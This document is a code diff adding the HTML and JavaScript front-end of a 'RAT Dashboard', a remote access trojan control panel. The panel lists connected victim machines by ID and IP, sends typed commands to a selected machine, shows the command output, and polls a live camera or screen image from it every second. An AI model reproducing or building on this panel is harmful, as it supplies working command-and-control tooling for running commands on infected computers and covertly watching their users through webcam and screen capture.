@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>RAT Dashboard</title>
+  <style>
+    body {
+      font-family: monospace, monospace;
+      background: #111;
+      color: #eee;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      height: 100vh;
+      overflow: hidden;
+    }
+    #sidebar {
+      width: 220px;
+      background: #222;
+      padding: 10px;
+      overflow-y: auto;
+      border-right: 1px solid #444;
+    }
+    #sidebar h2 {
+      margin-top: 0;
+      font-size: 1.4em;
+      text-align: center;
+    }
+    #clientsList {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    #clientsList li {
+      padding: 8px;
+      border-bottom: 1px solid #444;
+      cursor: pointer;
+      user-select: none;
+      transition: background 0.2s;
+    }
+    #clientsList li:hover {
+      background: #004466;
+    }
+    #clientsList li.active {
+      background: #005577;
+      font-weight: bold;
+    }
+    #main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      padding: 10px;
+      gap: 10px;
+      background: #121212;
+    }
+    #header {
+      font-size: 1.5em;
+      border-bottom: 1px solid #444;
+      padding-bottom: 5px;
+    }
+    #commandForm {
+      display: flex;
+      gap: 5px;
+    }
+    #commandInput {
+      flex: 1;
+      font-family: monospace;
+      font-size: 1.1em;
+      padding: 6px;
+      background: #222;
+      border: 1px solid #444;
+      color: #eee;
+      border-radius: 3px;
+    }
+    #sendCommandBtn {
+      padding: 6px 12px;
+      background: #005577;
+      border: none;
+      color: white;
+      cursor: pointer;
+      border-radius: 3px;
+      user-select: none;
+    }
+    #output, #frameContainer {
+      background: #000;
+      color: #0f0;
+      padding: 10px;
+      border-radius: 4px;
+      height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      flex: 1;
+    }
+    #frameContainer {
+      text-align: center;
+    }
+    #frameContainer img {
+      max-width: 100%;
+      max-height: 100%;
+      border-radius: 4px;
+      background: #222;
+    }
+    #noSelection {
+      color: #666;
+      font-style: italic;
+      text-align: center;
+      margin-top: 100px;
+      flex: 1;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="sidebar">
+    <h2>Clients</h2>
+    <ul id="clientsList"></ul>
+  </div>
+
+  <div id="main">
+    <div id="header">Select a client to interact</div>
+
+    <div id="noSelection">No client connected or selected</div>
+
+    <form id="commandForm" style="display:none;">
+      <input id="commandInput" placeholder="Type command here..." autocomplete="off" />
+      <button id="sendCommandBtn" type="submit">Send</button>
+    </form>
+
+    <div id="output" style="display:none;">Loading output...</div>
+
+    <div id="frameContainer" style="display:none;">
+      <h3>Live Camera / Screen</h3>
+      <img id="frameImage" src="" alt="No frame" />
+    </div>
+  </div>
+
+<script>
+  let clients = {};
+  let selectedClient = null;
+  const clientsList = document.getElementById('clientsList');
+  const header = document.getElementById('header');
+  const noSelection = document.getElementById('noSelection');
+  const commandForm = document.getElementById('commandForm');
+  const commandInput = document.getElementById('commandInput');
+  const outputDiv = document.getElementById('output');
+  const frameContainer = document.getElementById('frameContainer');
+  const frameImage = document.getElementById('frameImage');
+
+  async function fetchClients() {
+    try {
+      const res = await fetch('/clients');
+      if (!res.ok) throw new Error("Failed to load clients");
+      clients = await res.json();
+      renderClients();
+      if (selectedClient && !clients[selectedClient]) {
+        // If selected client disconnected
+        deselectClient();
+      }
+    } catch (err) {
+      console.error("Error fetching clients:", err);
+    }
+  }
+
+  function renderClients() {
+    clientsList.innerHTML = "";
+    if (Object.keys(clients).length === 0) {
+      clientsList.innerHTML = "<li>No clients connected</li>";
+      return;
+    }
+    for (const clientId in clients) {
+      const li = document.createElement('li');
+      const status = clients[clientId].status || 'offline';
+      li.textContent = `${clientId} (${clients[clientId].ip}) [${status}]`;
+      li.style.color = status === 'online' ? '#0f0' : '#f55'; // green for online, red for offline
+      li.dataset.clientId = clientId;
+      if (clientId === selectedClient) li.classList.add('active');
+      li.onclick = () => selectClient(clientId);
+      clientsList.appendChild(li);
+    }
+  }
+
+  function selectClient(clientId) {
+    selectedClient = clientId;
+    header.textContent = `Client: ${clientId}`;
+    noSelection.style.display = 'none';
+    commandForm.style.display = 'flex';
+    outputDiv.style.display = 'block';
+    frameContainer.style.display = 'block';
+    renderClients();
+    fetchOutput();  // immediate fetch
+    fetchFrame();   // immediate fetch
+  }
+
+  function deselectClient() {
+    selectedClient = null;
+    header.textContent = 'Select a client to interact';
+    noSelection.style.display = 'block';
+    commandForm.style.display = 'none';
+    outputDiv.style.display = 'none';
+    frameContainer.style.display = 'none';
+    renderClients();
+  }
+
+  async function sendCommand(cmd) {
+    if (!selectedClient) return;
+    try {
+      const res = await fetch(`/command/${selectedClient}`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({cmd})
+      });
+      if (!res.ok) throw new Error("Failed to send command");
+    } catch (err) {
+      console.error("Error sending command:", err);
+    }
+  }
+
+  async function fetchOutput() {
+    if (!selectedClient) return;
+    try {
+      const res = await fetch(`/output/${selectedClient}`);
+      if (!res.ok) throw new Error("Failed to fetch output");
+      const data = await res.json();
+      outputDiv.textContent = data.output || "[No output]";
+    } catch (err) {
+      outputDiv.textContent = "[Error loading output]";
+      console.error(err);
+    }
+  }
+
+  async function fetchFrame() {
+    if (!selectedClient) return;
+    try {
+      const res = await fetch(`/frame/${selectedClient}`);
+      if (!res.ok) throw new Error("Failed to fetch frame");
+      const data = await res.json();
+      if (data.frame) {
+        frameImage.src = `data:image/jpeg;base64,${data.frame}`;
+      } else {
+        frameImage.src = "";
+      }
+    } catch (err) {
+      frameImage.src = "";
+      console.error(err);
+    }
+  }
+
+  // Polling loops
+  setInterval(() => {
+    if (selectedClient) {
+      fetchOutput();
+      fetchFrame();
+    }
+  }, 1000);
+
+  // Refresh clients list every 10 seconds
+  setInterval(fetchClients, 10000);
+
+  // Command form submit
+  commandForm.addEventListener('submit', e => {
+    e.preventDefault();
+    const cmd = commandInput.value.trim();
+    if (!cmd) return;
+    sendCommand(cmd);
+    commandInput.value = "";
+  });
+
+  // Initial load
+  fetchClients();
+</script>
+
+</body>
+</html>
